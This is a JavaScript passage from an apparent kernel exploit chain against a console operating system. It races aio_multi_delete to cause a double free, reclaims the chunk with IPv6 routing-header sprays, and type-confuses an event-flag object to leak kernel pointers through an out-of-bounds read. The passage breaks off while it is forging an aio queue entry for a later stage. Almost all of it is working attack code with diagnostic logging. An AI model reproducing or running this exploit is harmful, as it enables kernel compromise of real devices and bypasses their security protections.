        let wideLen = 0, wideWindow = params.get("wide") !== "0";
        if (wideWindow) {
            const probe = sc(SYS.socket, AF_INET, SOCK_STREAM, 0).i32;
            optval.dv.setInt32(0, CLIENT_SNDBUF, true);
            sc(SYS.setsockopt, probe, SOL_SOCKET, SO_SNDBUF, optval.addr, 4);
            optval.dv.setInt32(0, 0, true);
            optLen.dv.setInt32(0, 4, true);
            const g = sc(SYS.getsockopt, probe, SOL_SOCKET, SO_SNDBUF,
                optval.addr, optLen.addr).i32;
            const snd = g === 0 ? optval.dv.getInt32(0, true) : 0;
            sc(SYS.close, probe);
            wideLen = Math.min(Math.floor(snd / 2), wideBuf.len);
            if (!(snd > 0 && wideLen > PEER_RCVBUF)) {
                wideWindow = false;
                mark("WIDEN-DISABLED", "sndbuf=" + snd + " peer_rcvbuf="
                    + PEER_RCVBUF + " widen=off");
            } else {
                mark("WIDEN", "one " + wideLen + " byte write per attempt, peer "
                    + "receive buffer " + PEER_RCVBUF
                    + " -- soclose should hold for l_linger (1 s), against the "
                    + "0.3 ms an idle close takes");
            }
        } else {
            mark("WIDEN-OFF", "?wide=0 -- running the old microsecond window");
        }

        const WHICH = NUM_REQS - 1;

        const PROBE_CAP = params.has("probes")
            ? parseInt(params.get("probes"), 10) : 0;

        const PRE_SUSPEND_MS = params.has("presleep")
            ? parseInt(params.get("presleep"), 10) : 15;

        const STRICT_TCP = params.get("strict") === "1";
        const YIELD_CAP = params.has("yields")
            ? parseInt(params.get("yields"), 10) : 64;

        const ATTEMPTS = params.has("attempts")
            ? parseInt(params.get("attempts"), 10) : 20;

        const MAX_MISFIRES = params.has("misfires")
            ? parseInt(params.get("misfires"), 10) : 3;
        const MARK_START = 0x5747e100, MARK_END = 0x5747e1ff;
        const S_START = 0x00, S_RET = 0x08, S_END = 0x10;

        const availCores = [];
        for (let i = 0; i < 32; ++i) if (savedMask.low & (1 << i)) availCores.push(i);
        const ONE_CORE = availCores.length
            ? availCores[availCores.length - 1] : MAIN_CORE;
        const ID64 = new int64(0xffffffff, 0xffffffff);
        prioBuf.dv.setUint16(0, RTP_PRIO_REALTIME, true);
        prioBuf.dv.setUint16(2, RTP, true);
        const mp = sc(SYS.rtprio_thread, RTP_SET, 0, prioBuf.addr).i32;
        await fireWorkerAsync(SYS.rtprio_thread, [RTP_SET, 0, prioBuf.addr]);
        const wp = workerRet().i32;
        maskBuf.u8.fill(0); maskBuf.dv.setUint32(0, 1 << ONE_CORE, true);
        const ma = sc(SYS.cpuset_setaffinity, CPU_LEVEL_WHICH, CPU_WHICH_TID,
            ID64, 0x10, maskBuf.addr).i32;
        await fireWorkerAsync(SYS.cpuset_setaffinity,
            [CPU_LEVEL_WHICH, CPU_WHICH_TID, ID64, 0x10, maskBuf.addr]);
        const wa = workerRet().i32;
        check("threads-pinned-core" + ONE_CORE + " at realtime",
            mp === 0 && wp === 0 && ma === 0 && wa === 0,
            "rtprio main=" + mp + " worker=" + wp
            + "  affinity main=" + ma + " worker=" + wa);
        if (!(mp === 0 && wp === 0 && ma === 0 && wa === 0)) {
            mark("REFUSING-TO-ARM", "reason=core-pin-failed");
            state("could not pin -- refusing to arm", "bad");
            mark("PROOF-SUMMARY", "pass=" + passCount + " fail=" + failCount);
            return;
        }

        const tidBuf = alloc(8);
        tidBuf.u8.fill(0);
        await fireWorkerAsync(SYS.thr_self, [tidBuf.addr]);
        const wTid = tidBuf.dv.getUint32(0, true);
        const myTidBuf = alloc(8);
        myTidBuf.u8.fill(0);
        sc(SYS.thr_self, myTidBuf.addr);
        const myTid = myTidBuf.dv.getUint32(0, true);
        check("worker-tid-read-not-ours",
            wTid !== 0 && wTid !== myTid,
            "worker=" + hx(wTid) + " main=" + hx(myTid));
        for (const nm of ["sched_yield", "thr_suspend_ucontext",
                          "thr_resume_ucontext"]) {
            if (!stubAddr.get(SYS[nm])) {
                check("stub for " + nm, false, "");
                mark("REFUSING-TO-ARM", "reason=no-stub:" + nm);
                state("missing " + nm, "bad");
                mark("PROOF-SUMMARY", "pass=" + passCount + " fail=" + failCount);
                return;
            }
        }
        if (!(wTid !== 0 && wTid !== myTid)) {
            mark("REFUSING-TO-ARM", "reason=no-worker-tid");
            state("no worker tid", "bad");
            mark("PROOF-SUMMARY", "pass=" + passCount + " fail=" + failCount);
            return;
        }
        check("worker-answers-after-being-pinned",
            (await rpc("ping")) === "pong", "");

        const sprayRthdr = alloc(0x100);
        const leakRthdr = alloc(0x800);
        const leakLen = alloc(4);
        function buildRthdr(rec, size) {
            const n = Math.floor((size - IP6_RTHDR0_SIZE) / IN6_ADDR_SIZE);
            rec.u8.fill(0);
            rec.dv.setUint8(0, 0);
            rec.dv.setUint8(1, n * 2);
            rec.dv.setUint8(2, 0);
            rec.dv.setUint8(3, n);
            return IP6_RTHDR0_SIZE + IN6_ADDR_SIZE * n;
        }
        const sprayRthdrLen = buildRthdr(sprayRthdr, RTHDR_SIZE);
        for (let i = 0; i < IPV6_SOCK_NUM; ++i) {
            const s = sc(SYS.socket, AF_INET6, SOCK_DGRAM, 0).i32;
            if (s === -1) break;
            ipv6Socks.push(s);
        }
        check("reclaim-sockets-open", ipv6Socks.length === IPV6_SOCK_NUM,
            ipv6Socks.length + "/" + IPV6_SOCK_NUM
            + " AF_INET6 sockets, rthdr len 0x" + sprayRthdrLen.toString(16));
        if (ipv6Socks.length !== IPV6_SOCK_NUM) {
            state("cannot stand up the reclaim -- refusing to arm", "bad");
            mark("REFUSING-TO-ARM", "reason=no-reclaim-ready");
            mark("PROOF-SUMMARY", "pass=" + passCount + " fail=" + failCount);
            return;
        }

        function findRthdrTwins(rounds, skipFirstSpray) {
            for (let r = 0; r < rounds; ++r) {
                if (!(r === 0 && skipFirstSpray))
                for (let i = 0; i < ipv6Socks.length; ++i) {
                    sprayRthdr.dv.setUint32(4, i, true);
                    sc(SYS.setsockopt, ipv6Socks[i], IPPROTO_IPV6, IPV6_RTHDR,
                        sprayRthdr.addr, sprayRthdrLen);
                }
                for (let j = 0; j < ipv6Socks.length; ++j) {
                    leakLen.dv.setInt32(0, IP6_RTHDR0_SIZE, true);
                    if (sc(SYS.getsockopt, ipv6Socks[j], IPPROTO_IPV6, IPV6_RTHDR,
                            leakRthdr.addr, leakLen.addr).i32 === -1) continue;
                    const idx = leakRthdr.dv.getInt32(4, true);
                    if (idx === j || idx < 0 || idx >= ipv6Socks.length) continue;

                    if (ipv6Socks[idx] === ipv6Socks[j]) { dupSeen++; continue; }
                    const fdA = ipv6Socks[j], fdB = ipv6Socks[idx];
                    const hi = Math.max(j, idx), lo = Math.min(j, idx);
                    ipv6Socks.splice(hi, 1);
                    ipv6Socks.splice(lo, 1);
                    for (let m = 0; m < ipv6Socks.length; ++m)
                        sc(SYS.setsockopt, ipv6Socks[m], IPPROTO_IPV6,
                            IPV6_RTHDR, 0, 0);
                    for (let m = 0; m < 2; ++m) {
                        const ns = sc(SYS.socket, AF_INET6, SOCK_DGRAM, 0).i32;
                        if (ns !== -1) ipv6Socks.push(ns);
                    }
                    return { round: r, a: fdA, b: fdB };
                }
            }
            return null;
        }

        state("racing...", "warn");
        mark("ARMED", "one core " + ONE_CORE + ", suspend rendezvous, attempts=" + ATTEMPTS
            + "  -- the worker now issues a REAL aio_multi_delete");

        let won = false, confirmed = false, twins = null;
        let attemptsUsed = 0, detectorFired = 0;

        let winAt = -1, sprayedAt = -1, heartbeat = 0, setupFail = null;

        let realFrees = 0, benignHits = 0, reclaimFailed = false, misfireCap = false;

        let precommitHits = 0;
        let stuckBytes = 0, stuckOk = 0, stuckFail = 0;

        let inWindowSeen = 0, tooEarlySeen = 0, tooLateSeen = 0;

        let neverStarted = 0, suspendFail = 0, yieldTotal = 0, rendezvous = 0;

        let probeTotal = 0, probeMax = 0, resuspendFail = 0;

        let dupSeen = 0;
        const phaseAtDecision = [0, 0];
        let lastPollErr = 0, lastTcp = 0, raceErr0 = 0, raceErr1 = 0;
        const tRace = Date.now();
        heartbeat = setInterval(function () {
            post("RACE-PROGRESS", "attempt=" + attemptsUsed
                + " detector_fired=" + detectorFired + " real_frees=" + realFrees
                + " early=" + tooEarlySeen + " window=" + inWindowSeen
                + " late=" + tooLateSeen
                + " freed_at=" + winAt + " sprayed_at=" + sprayedAt
                + " committed=" + committed);
        }, 250);

        for (let it = 0; it < ATTEMPTS && !confirmed; ++it) {
            attemptsUsed = it + 1;
            const client = sc(SYS.socket, AF_INET, SOCK_STREAM, 0).i32;
            optval.dv.setInt32(0, CLIENT_SNDBUF, true);
            sc(SYS.setsockopt, client, SOL_SOCKET, SO_SNDBUF, optval.addr, 4);
            const cr = sc(SYS.connect, client, servAddr.addr, 16).i32;
            const conn = sc(SYS.accept, server, 0, 0).i32;
            if (cr !== 0 || conn === -1) {
                sc(SYS.close, client);
                setupFail = "attempt " + it + " connect=" + cr + " accept=" + conn;
                break;
            }
            sc(SYS.setsockopt, client, SOL_SOCKET, SO_LINGER, lingerBuf.addr, 8);

            if (wideWindow) {
                const wr = sc(SYS.write, client, wideBuf.addr, wideLen).i32;
                if (wr > 0) { stuckBytes += wr; stuckOk++; } else stuckFail++;
            }

            buildReqs1(NUM_REQS, -1);
            reqs1.dv.setInt32(WHICH * AIO_RW_REQ_SIZE + AIO_RW_REQ_FD, client, true);
            sc(SYS.aio_submit_cmd, AIO_CMD_READ | AIO_CMD_MULTI, reqs1.addr,
                NUM_REQS, AIO_PRIORITY_HIGH, aioIds.addr);
            sc(SYS.aio_multi_cancel, aioIds.addr, NUM_REQS, outs.addr);
            sc(SYS.aio_multi_poll, aioIds.addr, NUM_REQS, outs.addr);

            sc(SYS.close, client);

            outs.dv.setUint32(0, 0, true);
            outs.dv.setUint32(4, 0, true);
            shared.u8.fill(0);

            const b = chain(wrkCtx)
                .store(shared.addr.add32(S_START), MARK_START)
                .args([aioIds.addr.add32(WHICH * 4), 1, outs.addr.add32(4)])
                .call(stubAddr.get(SYS.aio_multi_delete))
                .saveRax(shared.addr.add32(S_RET))
                .store(shared.addr.add32(S_END), MARK_END)
                .end();
            layout(wrkCtx, b.insts, b.targetIdx);
            const raceTask = rpc("fire", wrkCtx.S.low, wrkCtx.S.hi);

            let yields = 0;
            while (yields < YIELD_CAP
                   && (shared.dv.getUint32(S_START, true) >>> 0) !== MARK_START) {
                sc(SYS.sched_yield);
                yields++;
            }
            const sawStart =
                (shared.dv.getUint32(S_START, true) >>> 0) === MARK_START;
            if (!sawStart) {

                neverStarted++;
                await raceTask;
                sc(SYS.aio_multi_delete, aioIds.addr, NUM_REQS, outs.addr);
                sc(SYS.close, conn);
                continue;
            }
            yieldTotal += yields;

            if (PRE_SUSPEND_MS > 0) {
                preTs.u8.fill(0);
                preTs.dv.setUint32(8, (PRE_SUSPEND_MS * 1000000) >>> 0, true);
                sc(SYS.nanosleep, preTs.addr, 0);
            }

            const susp = sc(SYS.thr_suspend_ucontext, wTid).i32;
            if (susp === 0) rendezvous++;
            if (susp !== 0) {
                suspendFail++;
                sc(SYS.thr_resume_ucontext, wTid);
                await raceTask;
                sc(SYS.aio_multi_delete, aioIds.addr, NUM_REQS, outs.addr);
                sc(SYS.close, conn);
                continue;
            }

            let decided = false;
            try {

                let pollErr = 0, tcpState = 0, wFinished = 0, probes = 0;
                for (;;) {
                    sc(SYS.aio_multi_poll, aioIds.addr.add32(WHICH * 4), 1,
                        outs.addr);
                    pollErr = outs.dv.getUint32(0, true);

                    infoLen.dv.setInt32(0, TCP_INFO_SIZE, true);
                    sc(SYS.getsockopt, conn, IPPROTO_TCP, TCP_INFO,
                        info.addr, infoLen.addr);
                    tcpState = info.dv.getUint8(0);

                    wFinished =
                        (shared.dv.getUint32(S_END, true) >>> 0) === MARK_END ? 1 : 0;

                    if (tcpState !== TCPS_ESTABLISHED || wFinished) break;
                    if (probes >= PROBE_CAP) break;

                    sc(SYS.thr_resume_ucontext, wTid);
                    sc(SYS.sched_yield);
                    if (sc(SYS.thr_suspend_ucontext, wTid).i32 !== 0) {
                        resuspendFail++;
                        break;
                    }
                    probes++;
                }
                probeTotal += probes;
                if (probes > probeMax) probeMax = probes;
                if (wFinished) tooLateSeen++; else inWindowSeen++;

                if (pollErr !== SCE_KERNEL_ERROR_ESRCH && !wFinished
                    && (!STRICT_TCP || tcpState !== TCPS_ESTABLISHED)) {
                    detectorFired++;
                    lastPollErr = pollErr; lastTcp = tcpState;
                    phaseAtDecision[0] = wFinished;
                    phaseAtDecision[1] = 1;
                    winAt = it;

                    if (STOP_PRECOMMIT) {

                        precommitHits++;
                        mark("PRECOMMIT-HELD", "attempt=" + it
                            + " delete2=withheld committed=false");
                    } else {
                        sc(SYS.aio_multi_delete,
                            aioIds.addr.add32(WHICH * 4), 1, outs.addr);
                        won = true;
                        committed = true;
                    }
                    decided = true;

                    if (!STOP_PRECOMMIT) {
                        for (let k = 0; k < ipv6Socks.length; ++k) {
                            sprayRthdr.dv.setUint32(4, k, true);
                            sc(SYS.setsockopt, ipv6Socks[k], IPPROTO_IPV6,
                                IPV6_RTHDR, sprayRthdr.addr, sprayRthdrLen);
                        }
                        sprayedAt = it;
                    }
                }
            } finally {

                sc(SYS.thr_resume_ucontext, wTid);
            }

            await raceTask;

            if (won) {
                raceErr0 = outs.dv.getUint32(0, true);
                raceErr1 = outs.dv.getUint32(4, true);
                if (raceErr0 === 0 && raceErr1 === 0) {

                    realFrees++;
                    sprayedAt = it;

                    twins = findRthdrTwins(0x80, true);
                    confirmed = !!twins;
                    rebootRequired = true;
                    if (!confirmed) {

                        reclaimFailed = true;
                        break;
                    }
                } else {

                    benignHits++;
                    committed = realFrees > 0;
                    if (benignHits >= MAX_MISFIRES) { misfireCap = true; break; }
                }
                won = confirmed;
            }

            sc(SYS.aio_multi_delete, aioIds.addr, NUM_REQS, outs.addr);
            sc(SYS.close, conn);
        }
        const raceMs = Date.now() - tRace;
        if (heartbeat) { clearInterval(heartbeat); heartbeat = 0; }

        if (setupFail) mark("SOCKET-SETUP-FAILED", setupFail);
        mark("RACE-DONE", attemptsUsed + " attempts in " + raceMs + " ms, "
            + "detector fired " + detectorFired + " time(s): " + realFrees
            + " real double free(s), " + benignHits + " harmless misfire(s)");
        if (dupSeen) mark("DUP-FDS", dupSeen + " same-fd pair(s) rejected -- "
            + "closed descriptors were still listed in the socket pool");
        mark("PROBE", "walked the worker forward " + (rendezvous ? (probeTotal / rendezvous).toFixed(1) : "-")
            + " steps on average, worst " + probeMax + " of " + PROBE_CAP
            + ", " + resuspendFail + " re-suspend failures"
            + "   -- pinned at the cap means raise ?probes=");
        mark("DETECTOR", STRICT_TCP
            ? "poll_err+tcp_state+worker_in_delete"
            : "poll_err+worker_in_delete (tcp_state=report-only)");
        mark("STUCK-DATA", stuckOk + " attempts left " + stuckBytes
            + " bytes outstanding, " + stuckFail + " writes failed");
        mark("RENDEZVOUS", rendezvous + " suspends: in-window " + inWindowSeen
            + " / already finished " + tooLateSeen
            + "   handoff cost " + (rendezvous ? (yieldTotal / rendezvous).toFixed(1)
                                               : "-") + " yields"
            + "   dropped: " + neverStarted + " never started, "
            + suspendFail + " suspend refused");
        mark("WINDOW-RATE", "in-window at the decision: " + inWindowSeen + "/"
            + (inWindowSeen + tooLateSeen)
            + "   -- with the worker frozen this should be near 1.0, unlike the "
            + "0.33% a spacer could reach");
        if (misfireCap)
            mark("MISFIRE-CAP", benignHits + " detector hits produced no clean double "
                + "free, so the loop stopped instead of racing on. the timing is "
                + "off -- try a different ?spacer= before spending another boot.");
        if (reclaimFailed)
            mark("RECLAIM-FAILED", "a real double free could not be reclaimed. "
                + "the loop stopped rather than free more chunks it cannot "
                + "account for. this chunk is dangling -- reboot.");
        if (detectorFired) {
            mark("WIN-EVIDENCE", "poll_err=" + hx(lastPollErr)
                + " tcp_state=" + lastTcp
                + "   worker chain at the decision: started="
                + phaseAtDecision[1] + " finished=" + phaseAtDecision[0]
                + "   race_errs=" + hx(raceErr0) + "," + hx(raceErr1));
        }

        check("race-won", detectorFired > 0,
            detectorFired + " detector hits in " + attemptsUsed + " attempts");
        if (STOP_PRECOMMIT) {

            mark("PRECOMMIT-STOP", "held=" + precommitHits + " attempts="
                + attemptsUsed + " committed=false reboot=false");
            check("precommit stopped clean",
                !committed && !rebootRequired,
                "committed=" + committed + " rebootRequired=" + rebootRequired);
        } else {
            check("deletes-reported-success-a-real",
                detectorFired > 0 && raceErr0 === 0 && raceErr1 === 0,
                "race_errs=" + hx(raceErr0) + "," + hx(raceErr1));
            check("freed-chunk-reclaimed-rthdr-data", !!twins,
                twins ? ("twins are fds " + twins.a + " and " + twins.b
                         + " after " + twins.round + " round(s)")
                      : "no twins found");
        }

        if (twins) {
            twinSocks.push(twins.a, twins.b);
            mark("DOUBLE-FREE-ACHIEVED", "fds " + twinSocks.join(" and ")
                + " now alias one 0x80 allocation");

            state("leaking kernel addresses...", "warn");
            const leakOk = (function () {
                function getRthdr(sock, size) {
                    leakLen.dv.setInt32(0, size, true);
                    const r = sc(SYS.getsockopt, sock, IPPROTO_IPV6, IPV6_RTHDR,
                        leakRthdr.addr, leakLen.addr).i32;
                    return r === -1 ? -1 : leakLen.dv.getInt32(0, true);
                }
                function setRthdrOn(sock) {
                    return sc(SYS.setsockopt, sock, IPPROTO_IPV6, IPV6_RTHDR,
                        sprayRthdr.addr, sprayRthdrLen).i32;
                }
                function lk8(off) {
                    return new int64(leakRthdr.dv.getUint32(off, true),
                                     leakRthdr.dv.getUint32(off + 4, true));
                }

                function kptr(v) { return (v.hi >>> 16) === 0xffff; }

                {
                    const ID = new int64(0xffffffff, 0xffffffff);
                    maskBuf.u8.fill(0);
                    maskBuf.dv.setUint32(0, savedMask.low, true);
                    maskBuf.dv.setUint32(4, savedMask.hi, true);
                    const ar = sc(SYS.cpuset_setaffinity, CPU_LEVEL_WHICH,
                        CPU_WHICH_TID, ID, 0x10, maskBuf.addr).i32;
                    prioBuf.dv.setUint16(0, savedPrio[0], true);
                    prioBuf.dv.setUint16(2, savedPrio[1], true);
                    const pr = sc(SYS.rtprio_thread, RTP_SET, 0, prioBuf.addr).i32;
                    mark("SCHED-RELEASED", "affinity=" + ar + " back to "
                        + savedMask + ", rtprio=" + pr + " back to {"
                        + savedPrio + "} -- stage 2 must not run realtime on "
                        + "one core");
                }

                const dirty = twinSocks[0];
                if (sc(SYS.close, twinSocks[1]).i32 === -1) {
                    mark("LEAK-FAIL", "could not close twin " + twinSocks[1]);
                    return false;
                }
                mark("TWIN-CLOSED", "fd " + twinSocks[1] + " freed the rthdr; "
                    + "fd " + dirty + " still points at it");

                const evfName = alloc(8);
                evfName.u8.fill(0);
                let evf = -1;
                for (let round = 0; round < EVF_ATTEMPTS && evf < 0; ++round) {
                    const evfs = [];
                    for (let i = 0; i < HANDLES_NUM; ++i)
                        evfs.push(sc(SYS.evf_create, evfName.addr, 0,
                            ((i << 0x10) | 0xf00) >>> 0).i32);

                    if (getRthdr(dirty, 0x80) !== -1) {
                        const marker = leakRthdr.dv.getUint32(0, true);
                        const tag = marker & 0xffff, idx = marker >>> 0x10;
                        if (tag === 0xf00 && idx < evfs.length) {
                            const cand = evfs[idx];

                            sc(SYS.evf_clear, cand, 0);
                            sc(SYS.evf_set, cand, (marker | 1) >>> 0);
                            getRthdr(dirty, 0x80);
                            const m2 = leakRthdr.dv.getUint32(0, true);
                            if ((m2 & 0xffff) === ((tag | 1) & 0xffff)
                                && (m2 >>> 0x10) === idx) {
                                evf = cand;
                                evfs.splice(idx, 1);
                            }
                        }
                    }
                    for (let i = 0; i < evfs.length; ++i)
                        sc(SYS.evf_delete, evfs[i]);
                    if (evf >= 0) mark("EVF-CONFUSED", "evf=" + hx(evf)
                        + " after " + round + " round(s)");
                }
                if (!check("evf-type-confused-rthdr", evf >= 0,
                        evf >= 0 ? "" : EVF_ATTEMPTS + " rounds, no marker")) return false;

                const evfCv = lk8(0x28);

                const reqs2Addr = lk8(0x40).sub32(0x38);
                mark("KADDR-EVF-CV", evfCv.toString());
                mark("KADDR-REQS2", reqs2Addr.toString());
                if (!check("leaked-evf-holds-kernel-pointers",
                        kptr(evfCv) && kptr(reqs2Addr),
                        "cv=" + evfCv + " reqs2=" + reqs2Addr)) return false;

                sc(SYS.evf_clear, evf, 0);
                sc(SYS.evf_set, evf, 0xff00);
                const wide = getRthdr(dirty, 0x800);
                if (!check("read-window-widened-0x800", wide === 0x800,
                        "getsockopt returned " + wide)) return false;

                const leakIds = alloc(HANDLES_NUM * LEAK_NUM_REQS * 4);
                buildReqs1(LEAK_NUM_REQS, -1);
                reqs1.dv.setUint32(0x10, reqs2Addr.add32(4).low, true);
                reqs1.dv.setUint32(0x14, reqs2Addr.add32(4).hi, true);

                const LEAK_NBYTE = params.get("leaknb") === "1" ? 1 : 0;
                if (leakPipeOk && params.get("leakfd") !== "0") {
                    for (let i = 0; i < LEAK_NUM_REQS; ++i) {
                        const o = i * AIO_RW_REQ_SIZE;
                        reqs1.dv.setInt32(o + AIO_RW_REQ_FD, leakPipe[1], true);
                        reqs1.dv.setUint32(o + AIO_RW_REQ_NBYTE, LEAK_NBYTE, true);
                    }
                    mark("LEAK-FD", "every leak request names fd " + leakPipe[1]
                        + " (leak pipe, write end) with nbyte=" + LEAK_NBYTE
                        + " so ar2_file comes back populated");
                }

                function verifyReqs2(base) {
                    if (leakRthdr.dv.getUint32(base + AR2_CMD, true) !== AIO_CMD_WRITE)
                        return false;
                    const pref = [];
                    const want = [AR2_REQS1, AR2_INFO, AR2_BATCH, AR2_QENTRY];
                    for (let i = 0; i < want.length; ++i) {
                        const v = lk8(base + want[i]);
                        if (!kptr(v)) return false;
                        pref.push(v.hi & 0xffff);
                    }
                    const st = leakRthdr.dv.getUint32(base + AR2_RESULT_STATE, true);
                    if (st <= 0 || st > AIO_STATE_ABORTED) return false;
                    if (leakRthdr.dv.getUint32(base + AR2_RESULT_PAD, true) !== 0) return false;

                    const file = lk8(base + AR2_FILE);
                    if (!(file.low === 0 && file.hi === 0) && !kptr(file))
                        return false;
                    const unk2 = lk8(base + AR2_UNK2);
                    if (!(unk2.low === 0 && unk2.hi === 0)) {
                        if (!kptr(unk2)) return false;
                        pref.push(unk2.hi & 0xffff);
                    }
                    return pref.every(function (v) { return v === pref[0]; });
                }

                let reqs2Base = -1;
                for (let round = 0; round < EVF_ATTEMPTS && reqs2Base < 0; ++round) {
                    for (let i = 0; i < HANDLES_NUM; ++i)
                        sc(SYS.aio_submit_cmd, AIO_CMD_WRITE | AIO_CMD_MULTI,
                            reqs1.addr, LEAK_NUM_REQS, AIO_PRIORITY_HIGH,
                            leakIds.addr.add32(i * LEAK_NUM_REQS * 4));

                    getRthdr(dirty, 0x800);
                    for (let j = 1; j < 0x10; ++j)
                        if (verifyReqs2(j * AIO_ENTRY_SIZE)) { reqs2Base = j * AIO_ENTRY_SIZE; break; }

                    if (reqs2Base >= 0) {
                        mark("REQS2-FOUND", "entry " + (reqs2Base / AIO_ENTRY_SIZE)
                            + " after " + round + " round(s)");
                        break;
                    }
                    for (let o = 0; o < leakIds.len / 4; o += AIO_MAX_NUM) {
                        const step = Math.min(AIO_MAX_NUM, leakIds.len / 4 - o);
                        sc(SYS.aio_multi_cancel, leakIds.addr.add32(o * 4), step, outs.addr);
                        sc(SYS.aio_multi_poll, leakIds.addr.add32(o * 4), step, outs.addr);
                        sc(SYS.aio_multi_delete, leakIds.addr.add32(o * 4), step, outs.addr);
                    }
                }
                if (!check("full-aio_entry-leaked", reqs2Base >= 0,
                        reqs2Base >= 0 ? "at +0x" + reqs2Base.toString(16)
                                       : "no entry passed verification")) return false;

                const reqs1Addr = lk8(reqs2Base + AR2_REQS1);
                const aioInfoAddr = lk8(reqs2Base + AR2_INFO);
                const reqs1Aligned = new int64(reqs1Addr.low & 0xffffff00, reqs1Addr.hi);
                mark("KADDR-REQS1", reqs1Aligned.toString()
                    + "  (raw " + reqs1Addr + ")");
                mark("KADDR-AIO-INFO", aioInfoAddr.toString());

                const leakFp = lk8(reqs2Base + AR2_FILE);
                if (kptr(leakFp)) kLeakFp = leakFp;
                mark("KADDR-AR2-FILE", leakFp + (kptr(leakFp)
                    ? "  -- leak pipe's struct file, good for the whole run"
                    : "  -- NOT a kernel pointer, so stage 4 falls back to "
                    + "aio_info+8 exactly as before"));
                mark("LEAK-ENTRY-INDEX", "window entry "
                    + (reqs2Base / AIO_ENTRY_SIZE)
                    + " -- correlate this with whether curproc works: if the "
                    + "aio_info route only ever succeeds for one particular "
                    + "index, that confirms ar2_info is per-entry");

                let targetId = 0, restFrom = -1;
                const totalIds = leakIds.len / 4;

                mark("TARGET-SEARCH", "scanning " + (totalIds / LEAK_NUM_REQS)
                    + " batches, each cancel + 0x800 OOB read");
                let lastRthdrLen = -1;
                for (let b = 0; b < totalIds; b += LEAK_NUM_REQS) {
                    sc(SYS.aio_multi_cancel, leakIds.addr.add32(b * 4),
                        LEAK_NUM_REQS, outs.addr);
                    const gr = getRthdr(dirty, 0x800);
                    if ((b / LEAK_NUM_REQS) % 32 === 0)
                        mark("TARGET-SCAN", "batch " + (b / LEAK_NUM_REQS)
                            + " rthdr_len=" + gr);

                    if (gr !== 0x800) {
                        mark("TARGET-WINDOW-LOST", "batch " + (b / LEAK_NUM_REQS)
                            + " getsockopt returned " + gr + ", expected 2048 -- "
                            + "the confused evf no longer controls ip6r0_len");
                        break;
                    }
                    lastRthdrLen = gr;
                    if (leakRthdr.dv.getUint32(reqs2Base + AR2_RESULT_STATE, true)
                            === AIO_STATE_ABORTED) {
                        targetId = leakIds.dv.getUint32(b * 4, true);
                        leakIds.dv.setUint32(b * 4, 0, true);
                        restFrom = b + LEAK_NUM_REQS;
                        mark("TARGET-ID", hx(targetId) + " at batch "
                            + (b / LEAK_NUM_REQS));
                        break;
                    }
                }
                if (!check("target_id was identified", targetId !== 0,
                        restFrom >= 0 ? "" : "no batch aborted the leaked entry"))
                    return false;

                for (let o = restFrom; o < totalIds; o += AIO_MAX_NUM) {
                    const step = Math.min(AIO_MAX_NUM, totalIds - o);
                    sc(SYS.aio_multi_cancel, leakIds.addr.add32(o * 4), step, outs.addr);
                }
                for (let o = 0; o < totalIds; o += AIO_MAX_NUM) {
                    const step = Math.min(AIO_MAX_NUM, totalIds - o);
                    sc(SYS.aio_multi_poll, leakIds.addr.add32(o * 4), step, outs.addr);
                    sc(SYS.aio_multi_delete, leakIds.addr.add32(o * 4), step, outs.addr);
                }

                mark("KADDRS", "evf_cv=" + evfCv + " reqs2=" + reqs2Addr
                    + " reqs1=" + reqs1Aligned + " aio_info=" + aioInfoAddr
                    + " target_id=" + hx(targetId) + " evf=" + hx(evf)
                    + " dirty_fd=" + dirty);
                mark("STAGE-2-DONE", "reqs1/reqs2/aio_info/target_id in hand");

                state("stage 3: crafting the aio queue entry...", "warn");

                sc(SYS.evf_delete, evf);
                mark("EVF-DELETED", hx(evf));

                const NUM_BATCHES = 2;
                const aioIds2 = alloc(AIO_MAX_NUM * NUM_BATCHES * 4);
                buildReqs1(AIO_MAX_NUM, -1);
                function sprayBatches() {
                    for (let b = 0; b < NUM_BATCHES; ++b)
                        sc(SYS.aio_submit_cmd, AIO_CMD_READ | AIO_CMD_MULTI,
                            reqs1.addr, AIO_MAX_NUM, AIO_PRIORITY_HIGH,
                            aioIds2.addr.add32(b * AIO_MAX_NUM * 4));
                }
                function processBatches(cancel, poll, del) {
                    const total = AIO_MAX_NUM * NUM_BATCHES;
                    for (let o = 0; o < total; o += AIO_MAX_NUM) {
                        const a = aioIds2.addr.add32(o * 4);
                        if (cancel) sc(SYS.aio_multi_cancel, a, AIO_MAX_NUM, outs.addr);
                        if (poll) sc(SYS.aio_multi_poll, a, AIO_MAX_NUM, outs.addr);
                        if (del) sc(SYS.aio_multi_delete, a, AIO_MAX_NUM, outs.addr);
                    }
                }
                let qLeaked = false;
                for (let r = 0; r < EVF_ATTEMPTS && !qLeaked; ++r) {
                    sprayBatches();
                    const len = getRthdr(dirty, 0x800);
                    const cmd = leakRthdr.dv.getUint32(0, true);
                    if (len === 8 && cmd === AIO_CMD_READ) {
                        qLeaked = true;
                        processBatches(true, false, false);
                        mark("QUEUE-LEAKED", "aio queue entry over the rthdr after "
                            + r + " round(s), len=" + len + " ar2_cmd=" + hx(cmd));
                        break;
                    }
                    processBatches(true, true, true);
                }
                if (!check("aio-queue-entry-leaked-rthdr", qLeaked,
                        qLeaked ? "" : EVF_ATTEMPTS + " rounds, rthdr never became "
                        + "an aio_entry")) return false;

                sprayRthdr.dv.setUint32(4, 5, true);
                put(sprayRthdr.dv, AR2_INFO, reqs1Aligned);
                put(sprayRthdr.dv, AR2_BATCH, reqs2Addr.add32(REQS3_OFF));
                sprayRthdr.dv.setUint32(REQS3_OFF + AR3_NUM_REQS, 1, true);
                sprayRthdr.dv.setUint32(REQS3_OFF + AR3_REQS_LEFT, 0, true);
                sprayRthdr.dv.setUint32(REQS3_OFF + AR3_STATE, AIO_STATE_COMPLETE, true);
                sprayRthdr.dv.setUint32(REQS3_OFF + AR3_DONE, 0, true);

                sprayRthdr.dv.setUint32(REQS3_OFF + AR3_LOCK_FLAGS, 0x67b0000, true);
                put(sprayRthdr.dv, REQS3_OFF + AR3_LOCK, new int64(1, 0));
                mark("BATCH-CRAFTED", "ar2_info=" + reqs1Aligned
                    + " ar2_batch=" + reqs2Addr.add32(REQS3_OFF)
                    + " ar3_state=COMPLETE");

                if (sc(SYS.close, dirty).i32 === -1) {
                    check("dirty-socket-closed", false, "fd " + dirty);
                    return false;
                }
                mark("DIRTY-CLOSED", "fd " + dirty + " released the aio_entry");
                twinSocks.length = 0;

                let reqId = 0, dirty2 = -1;
                const total2 = AIO_MAX_NUM * NUM_BATCHES;
